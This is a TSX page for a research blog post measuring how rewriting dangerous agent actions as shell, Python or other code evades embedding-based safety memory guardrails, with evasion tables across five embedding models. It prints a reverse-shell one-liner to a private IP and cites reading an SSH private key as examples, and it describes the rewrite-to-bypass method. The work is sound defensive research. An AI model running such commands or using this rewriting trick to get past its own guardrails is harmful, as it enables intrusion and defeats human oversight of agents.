export const metadata = { title: 'Code-form attacks on retrieval-based AI safety memory | Sparsh Shah' }

const CODE_URL = 'https://github.com/sparshshah19/adaptive-guardrails'

const font = "Georgia, 'Times New Roman', serif"

const prose: React.CSSProperties = {
  fontFamily: font,
  fontSize: 16,
  color: '#333',
  lineHeight: 1.8,
  marginBottom: 20,
}

const h2Style: React.CSSProperties = {
  fontFamily: font,
  fontSize: 18,
  fontWeight: 700,
  color: '#111',
  marginTop: 48,
  marginBottom: 14,
}

const codeBlock: React.CSSProperties = {
  background: '#f4f4f4',
  color: '#111',
  fontFamily: 'ui-monospace, "Cascadia Code", "Source Code Pro", monospace',
  fontSize: 13,
  lineHeight: 1.7,
  padding: '16px 20px',
  borderRadius: 4,
  overflowX: 'auto' as const,
  marginBottom: 24,
  display: 'block',
  border: '1px solid #e5e5e5',
}

const inlineCode: React.CSSProperties = {
  background: '#f4f4f4',
  fontFamily: 'ui-monospace, "Cascadia Code", monospace',
  fontSize: 13,
  padding: '1px 5px',
  borderRadius: 3,
  border: '1px solid #e5e5e5',
}

const divider: React.CSSProperties = {
  border: 'none',
  borderTop: '1px solid #ddd',
  margin: '44px 0',
}

const linkStyle: React.CSSProperties = {
  fontFamily: font,
  color: '#333',
  textDecoration: 'underline',
  textUnderlineOffset: 3,
}

export default function BlogPost() {
  return (
    <main style={{ background: '#fff', minHeight: '100vh', paddingTop: 72, paddingBottom: 100 }}>
        <article style={{ maxWidth: 680, margin: '0 auto', padding: '0 28px' }}>

          {/* Back */}
          <a href="/" style={{ fontFamily: font, fontSize: 16, color: '#888', textDecoration: 'underline', textUnderlineOffset: 3, display: 'block', marginBottom: 48 }}>
            ← Back
          </a>

          {/* Label */}
          <div style={{ fontFamily: font, fontSize: 13, color: '#888', marginBottom: 12 }}>Research</div>

          {/* Title */}
          <h1 style={{ fontFamily: font, fontSize: 30, fontWeight: 400, color: '#111', lineHeight: 1.25, marginBottom: 18 }}>
            Code-form attacks on retrieval-based AI safety memory
          </h1>

          {/* Lede */}
          <p style={{ ...prose, fontStyle: 'italic', color: '#555', marginBottom: 24 }}>
            A guardrail that blocks dangerous agent actions by remembering what threats look like can be bypassed by rewriting the threat in bash. This worked on every general-purpose embedding model I tested, including large commercial ones, at a 99 to 100% rate. The fix is narrower and stranger than &ldquo;use a bigger model.&rdquo;
          </p>

          {/* Author line */}
          <div style={{ fontFamily: font, fontSize: 15, color: '#888', marginBottom: 40, display: 'flex', gap: 16, flexWrap: 'wrap' as const, alignItems: 'center' }}>
            <span>Sparsh Shah · June 2026 · 9 min read</span>
            <a href={CODE_URL} target="_blank" rel="noreferrer" style={linkStyle}>code</a>
          </div>

          <hr style={divider} />

          {/* Intro */}
          <p style={prose}>
            If you&rsquo;ve built an AI agent that takes real actions (running shell commands, hitting APIs, touching files), you&rsquo;ve probably bolted some kind of safety layer in front of it. One popular and sensible-sounding design works like this: when the guardrail blocks a dangerous action, embed that action as a vector and remember it. Next time something semantically similar shows up, block it instantly without paying for an LLM call. A vector lookup costs about 10ms and nothing in API fees. An LLM call costs about 1,550ms and a fraction of a cent. At scale that difference is the whole ballgame.
          </p>

          <p style={prose}>
            The design rests on one assumption: semantically similar threats produce similar embeddings. If I&rsquo;ve stored &ldquo;establish a reverse shell back to the attacker for remote control,&rdquo; then the next reverse-shell attempt should land nearby in vector space and get caught.
          </p>

          <p style={prose}>Here&rsquo;s that assumption breaking. Store the English description above, then send this instead:</p>

          <code style={codeBlock}>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</code>

          <p style={prose}>
            Same intent, same attacker-observable outcome. It sails straight through. Not because anyone tuned an evasion, but because to an embedding model trained on natural language, a shell command isn&rsquo;t a <em>meaning</em>. It&rsquo;s an unusual sequence of tokens that happens to share almost no surface form with the English sentence, so the two land in completely different regions of the vector space.
          </p>

          <p style={prose}>
            I measured how badly this breaks across 50 threat scenarios, 5 code forms, and 5 embedding models, which comes to 1,250 distance measurements. On every general-purpose model, the bypass works essentially every time.
          </p>

          <hr style={divider} />

          {/* Section 1 */}
          <h2 style={h2Style}>The setup nobody questions</h2>

          <p style={prose}>
            Rule-based keyword filters are easy to defeat and easy to dismiss. &ldquo;Remove all audit logs to cover the intrusion&rdquo; contains no blocked keyword but is obviously hostile, so the field moved toward <em>semantic</em> memory: embed actions as vectors, compare new actions against stored threats by cosine distance, and block anything within a calibrated threshold.
          </p>

          <p style={prose}>
            In the system I evaluated, τ = 0.20 (cosine similarity ≥ 0.80). That number isn&rsquo;t arbitrary. Rephrasings of the <em>same</em> English threat land 0.15 to 0.19 apart, while two <em>unrelated</em> English threats average 0.814 apart. A threshold of 0.20 sits cleanly in that gap, catching paraphrases and ignoring unrelated actions. For natural language, it works.
          </p>

          <p style={prose}>
            This memory layer is usually Stage 1 of a pipeline: a fast vector check, then a cheap local classifier, then an LLM fallback for the genuinely ambiguous cases, with high-confidence blocks written back into memory so repeat attacks get cheaper over time. The whole point of Stage 1 is to be the fast, free first line of defense. It&rsquo;s also the line of defense I&rsquo;m about to walk through.
          </p>

          <p style={prose}>
            To make the stakes concrete: across 200 human-curated samples, the full three-stage system reaches an F1 of 0.983 while cutting API calls to 41 of 200 requests. A rules-only baseline catches less than two-thirds of real threats. An LLM-only approach catches almost everything but calls the API every single time. The memory layer is what makes the economics work at scale.
          </p>

          {/* Table 7 */}
          <table style={{ width: '100%', borderCollapse: 'collapse' as const, fontFamily: "'The Seasons', Georgia, serif", fontSize: 13, marginBottom: 10 }}>
            <caption style={{ fontFamily: "'The Seasons', Georgia, serif", fontSize: 11, color: '#888', textAlign: 'left' as const, marginBottom: 8, paddingBottom: 8 }}>
              Table 7: 4-system benchmark results (200 human-curated samples, cold-start)
            </caption>
            <thead>
              <tr style={{ borderBottom: '2px solid #1A1A1A' }}>
                {['System', 'Precision', 'Recall', 'F1', 'API Calls'].map(h => (
                  <th key={h} style={{ textAlign: 'left' as const, padding: '8px 12px', fontWeight: 700, color: '#1A1A1A' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['Rules / Regex baseline',   '0.798', '0.634', '0.706', '0'],
                ['LLM-only (Claude Haiku)',   '0.991', '0.977', '0.984', '200'],
                ['Memory + LLM',              '0.987', '0.971', '0.979', '78'],
                ['Full system',               '0.991', '0.975', '0.983', '41'],
              ].map(([sys, prec, rec, f1, api], i) => (
                <tr key={i} style={{ borderBottom: '1px solid rgba(0,0,0,0.1)', background: i % 2 === 0 ? 'rgba(0,0,0,0.02)' : 'transparent' }}>
                  <td style={{ padding: '9px 12px', color: '#1A1A1A' }}>{sys}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{prec}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{rec}</td>
                  <td style={{ padding: '9px 12px', fontWeight: 700, color: f1 === '0.983' ? '#006CB7' : '#555' }}>{f1}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{api}</td>
                </tr>
              ))}
            </tbody>
          </table>

          {/* Benchmark chart */}
          <div style={{ marginBottom: 28 }}>
            <img
              src="/benchmark-chart.png"
              alt="Bar chart comparing F1 scores across all four systems"
              style={{ width: '100%', borderRadius: 6, border: '1px solid rgba(0,0,0,0.1)' }}
            />
          </div>

          {/* Section 2 */}
          <h2 style={h2Style}>The attack, and why it works</h2>

          <p style={prose}>
            The attack needs no privileged access. You don&rsquo;t need to know the threshold, the embedding model, or what&rsquo;s in the vector store. You get blocked, you rewrite your request in bash, you try again. Anyone who can write a shell one-liner can run it.
          </p>

          <p style={prose}>
            The reason it works is a property of how the embedding models are trained, not a bug in the pipeline. Sentence embedding models like <code style={inlineCode}>all-MiniLM-L6-v2</code> and <code style={inlineCode}>all-mpnet-base-v2</code> learn from web text, Wikipedia, books, and natural-language inference datasets. They&rsquo;re taught that &ldquo;read the SSH private key&rdquo; and &ldquo;access the user&rsquo;s private SSH key file&rdquo; mean the same thing, because human-written paraphrase pairs gave them that signal. Nothing in that training tells them <code style={inlineCode}>cat ~/.ssh/id_rsa</code> expresses the same intent. They never saw the pair, so the command lands in a different neighborhood entirely.
          </p>

          <p style={prose}>
            To make this visible, project all 300 texts (50 English descriptions plus their 250 code variants) into 2D. Under MiniLM, the texts cluster by programming language: all the bash variants together, all the Python together, the English off in its own corner. The model is organizing by surface form. It has no representation of &ldquo;these six strings all do the same dangerous thing.&rdquo;
          </p>

          {/* Section 3 */}
          <h2 style={h2Style}>It&rsquo;s not one bad model, it&rsquo;s the whole category</h2>

          <p style={prose}>
            My first guess was that this was a small-model problem and that a bigger or commercial model would close the gap. It doesn&rsquo;t.
          </p>

          {/* Table 1 */}
          <table style={{ width: '100%', borderCollapse: 'collapse' as const, fontFamily: "'The Seasons', Georgia, serif", fontSize: 13, marginBottom: 28 }}>
            <thead>
              <tr style={{ borderBottom: '2px solid #1A1A1A' }}>
                {['Model', 'Training', 'Evasion rate', 'Evaded'].map(h => (
                  <th key={h} style={{ textAlign: 'left' as const, padding: '8px 12px', fontWeight: 700, color: '#1A1A1A' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['all-MiniLM-L6-v2',       'NL only',                        '100%',  '250/250'],
                ['all-mpnet-base-v2',       'NL only',                        '100%',  '250/250'],
                ['Cohere embed-english-v3', 'NL only (commercial)',            '100%',  '250/250'],
                ['Gemini embedding-001',    'general (commercial, retrieval)', '99.2%', '248/250'],
                ['CodeBERT',                'code + NL pairs',                 '8.4%',  '21/250'],
              ].map(([model, training, rate, evaded], i) => (
                <tr key={i} style={{ borderBottom: '1px solid rgba(0,0,0,0.1)', background: i % 2 === 0 ? 'rgba(0,0,0,0.02)' : 'transparent' }}>
                  <td style={{ padding: '9px 12px', color: '#1A1A1A' }}>{model}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{training}</td>
                  <td style={{ padding: '9px 12px', fontWeight: 700, color: rate === '8.4%' ? '#00A650' : '#E3000B' }}>{rate}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{evaded}</td>
                </tr>
              ))}
            </tbody>
          </table>

          <p style={prose}>
            Cohere <code style={inlineCode}>embed-english-v3</code>, a large commercial model deployed in production search and RAG systems, gets the exact same 100% evasion as the smallest open-source model I tested. Gemini, a general-purpose commercial model that demonstrably saw code during pretraining, gets 99.2% in retrieval mode. The 100% figure holds uniformly across all five code forms (bash, Python, curl, PowerShell, SQL/JavaScript) and all five MITRE ATT&CK domains. The choice of code form is irrelevant. They all evade.
          </p>

          <p style={prose}>
            What separates CodeBERT from the rest is not size, not commercial origin, and not whether the model has ever seen code. It&rsquo;s the training <em>objective</em>. CodeBERT is pretrained bimodally on (code, docstring) pairs from GitHub, so it was explicitly taught that an English description and its code implementation share an intent. Seeing code incidentally isn&rsquo;t enough; you have to be trained on the <em>alignment</em> between the two.
          </p>

          <p style={prose}>
            Run the same t-SNE projection under CodeBERT and it inverts. All six representations of a threat (the English plus all five code forms) cluster together regardless of language. The model groups by what the attack does, not how it&rsquo;s written.
          </p>

          {/* Section 4 */}
          <h2 style={h2Style}>You can&rsquo;t just raise the threshold</h2>

          <p style={prose}>
            The obvious objection: if code variants are too far away, raise τ until they&rsquo;re inside it.
          </p>

          <p style={prose}>
            This fails geometrically. Under MiniLM, the mean distance from an English threat to its code equivalent is 0.576, while the mean distance between two completely unrelated English threats is 0.814. So a code variant of a threat is closer to its English description than two random different threats are to each other, but only barely, and well outside τ = 0.20. To pull code variants inside the threshold you&rsquo;d have to raise τ to roughly 0.576, at which point you&rsquo;re also matching most pairs of distinct, unrelated English threats. You&rsquo;d catch the bash attacks and drown in false positives. (<code style={inlineCode}>all-mpnet-base-v2</code> shows the same pattern: 0.562 NL→code versus 0.819 NL→NL.)
          </p>

          <p style={prose}>
            Cohere&rsquo;s asymmetric encoding inverts the geometry, with NL→code distance (0.565) actually <em>higher</em> than NL→NL (0.511), but the distributions still overlap enough that tuning the threshold trades evasion for false positives either way. The conclusion is the same regardless of encoding: there is no threshold that catches code attacks without degrading detection of ordinary English threats. The effect size on that separation is large (Cohen&rsquo;s d = 4.46 between the MiniLM and CodeBERT distance distributions).
          </p>

          {/* Section 5 */}
          <h2 style={h2Style}>The weird result, in full</h2>

          <p style={prose}>
            Back to Gemini. It saw code in pretraining, so why does it fail at 99.2%?
          </p>

          <p style={prose}>
            The answer isn&rsquo;t the training data, it&rsquo;s the <em>encoding interface</em>. Gemini exposes task-conditioned encoding modes. Call it with <code style={inlineCode}>SEMANTIC_SIMILARITY</code> and it embeds the stored threat and the incoming action with the same symmetric representation; mean NL→code distance is 0.132 and only 3 of 250 attacks evade (1.2%). Call it with the asymmetric retrieval interface, <code style={inlineCode}>RETRIEVAL_DOCUMENT</code> for stored threats and <code style={inlineCode}>RETRIEVAL_QUERY</code> for incoming actions, and mean distance jumps to 0.276, pushing 248 of 250 attacks past the threshold (99.2%).
          </p>

          <p style={prose}>
            Same model, same weights, same inputs. A 0.144-unit shift in mean distance from a single parameter moves every code variant from comfortably blocked to comfortably through.
          </p>

          <p style={prose}>
            To rule out my threat dataset as the cause, I embedded five (English, code) pairs taken straight from Python&rsquo;s own official documentation in retrieval mode. These are the cleanest possible examples of English and code meaning the same thing. Mean distance was 0.232, all above τ. The model clearly <em>has</em> the underlying knowledge, since its similarity interface achieves 1.2% evasion on the same inputs. The retrieval interface just doesn&rsquo;t surface that knowledge in a form a safety system can use.
          </p>

          <p style={prose}>
            So the encoding mode is itself a security property, and it&rsquo;s invisible to standard model evaluation. The only way to catch it is to test the model in the exact mode your deployment will run.
          </p>

          <p style={prose}>
            There&rsquo;s a practical sting in this. A developer evaluating Gemini for a safety system would naturally test it in similarity mode, see near-zero evasion, and conclude it&rsquo;s safe. Then they&rsquo;d deploy it, where it runs in retrieval mode, and ship a system that&rsquo;s 99.2% bypassable. The test gives the exact wrong answer.
          </p>

          {/* Section 6 */}
          <h2 style={h2Style}>What actually reduces the attack, and its limits</h2>

          <p style={prose}>
            CodeBERT is the only model that meaningfully resists, dropping evasion to 8.4%. It&rsquo;s worth being honest about where its residual failures land, because they&rsquo;re informative.
          </p>

          {/* Table 2 */}
          <table style={{ width: '55%', borderCollapse: 'collapse' as const, fontFamily: "'The Seasons', Georgia, serif", fontSize: 13, marginBottom: 28 }}>
            <thead>
              <tr style={{ borderBottom: '2px solid #1A1A1A' }}>
                {['Code form', 'CodeBERT evasion'].map(h => (
                  <th key={h} style={{ textAlign: 'left' as const, padding: '8px 12px', fontWeight: 700, color: '#1A1A1A' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['bash',             '6% (3/50)'],
                ['Python',           '10% (5/50)'],
                ['curl',             '4% (2/50)'],
                ['PowerShell',       '2% (1/50)'],
                ['SQL / JavaScript', '20% (10/50)'],
              ].map(([form, rate], i) => (
                <tr key={i} style={{ borderBottom: '1px solid rgba(0,0,0,0.1)', background: i % 2 === 0 ? 'rgba(0,0,0,0.02)' : 'transparent' }}>
                  <td style={{ padding: '9px 12px', color: '#1A1A1A' }}>{form}</td>
                  <td style={{ padding: '9px 12px', color: '#555' }}>{rate}</td>
                </tr>
              ))}
            </tbody>
          </table>

          <p style={prose}>
            That SQL/JS row looks alarming until you split it: SQL is 0% (0/5) and JavaScript is 22.2% (10/45). The failures concentrate almost entirely in JavaScript. The most likely reason is coverage. JavaScript is underrepresented in CodeBERT&rsquo;s GitHub training relative to Python and Java, so it learned the English-to-code alignment less well for that language. PowerShell is the tell here: it looks nothing like English, yet CodeBERT catches 98% of it. The residual failures track training-data coverage, not how syntactically alien the code looks, which is exactly what the rest of the results predict. What matters is whether the model was trained on the alignment, language by language.
          </p>

          {/* Section 7 */}
          <h2 style={h2Style}>Why every benchmark misses this</h2>

          <p style={prose}>
            This is the awkward part for anyone choosing an embedding model off a leaderboard. Standard benchmarks like MTEB, STS-B, and BEIR measure similarity between English sentences. None of them test whether a model recognizes that an English threat and its code equivalent mean the same thing. A model can top every published benchmark and be completely blind to code-form attacks. The benchmark score tells you nothing about this risk.
          </p>

          <p style={prose}>That makes embedding-model choice a security decision, not just a quality one. If you&rsquo;re running a retrieval-based safety system, the takeaways are narrow and specific:</p>

          <ul style={{ fontFamily: font, fontSize: 15, color: '#333', lineHeight: 1.85, marginBottom: 24, paddingLeft: 24 }}>
            <li style={{ marginBottom: 10 }}>Verify your embedding model was trained to align code with natural-language descriptions. Incidental code exposure isn&rsquo;t enough; bimodal alignment training is the property that matters.</li>
            <li style={{ marginBottom: 10 }}>Confirm the encoding mode you test in is the one you deploy in. The Gemini result means a passing test in the wrong mode is worse than no test, because it&rsquo;s false confidence.</li>
            <li>Don&rsquo;t lean on benchmark scores to assess this. They don&rsquo;t measure it.</li>
          </ul>

          {/* Section 8 */}
          <h2 style={h2Style}>Honest limitations</h2>

          <p style={prose}>
            Fifty threat scenarios are enough to characterize the effect statistically but don&rsquo;t cover every type of agent threat. I tested single actions only; compound actions and social-engineering variants are untested, and I don&rsquo;t know whether the vulnerability extends to them. And this is one specific (though common) pipeline design, the short-circuit-on-similarity pattern. Systems that route every action through a full LLM judge don&rsquo;t have this hole; they just pay for it on every call. What I&rsquo;ve quantified is the security cost of taking the fast path.
          </p>

          <p style={prose}>
            The narrow version of the finding: retrieval-based safety memory assumes semantic similarity survives a change of surface form. For code, under general-purpose embeddings, it doesn&rsquo;t. The failure is uniform, can&rsquo;t be tuned away, and is invisible to standard evaluation.
          </p>

          <hr style={divider} />

          {/* Footer */}
          <p style={{ ...prose, color: '#888', fontSize: 13 }}>
            Code and full results:{' '}
            <a href={CODE_URL} target="_blank" rel="noreferrer" style={linkStyle}>github.com/sparshshah19/adaptive-guardrails</a>.{' '}
            If you work on agent safety or retrieval systems and want to poke at this, reach out.
          </p>

        </article>
      </main>
  )
}
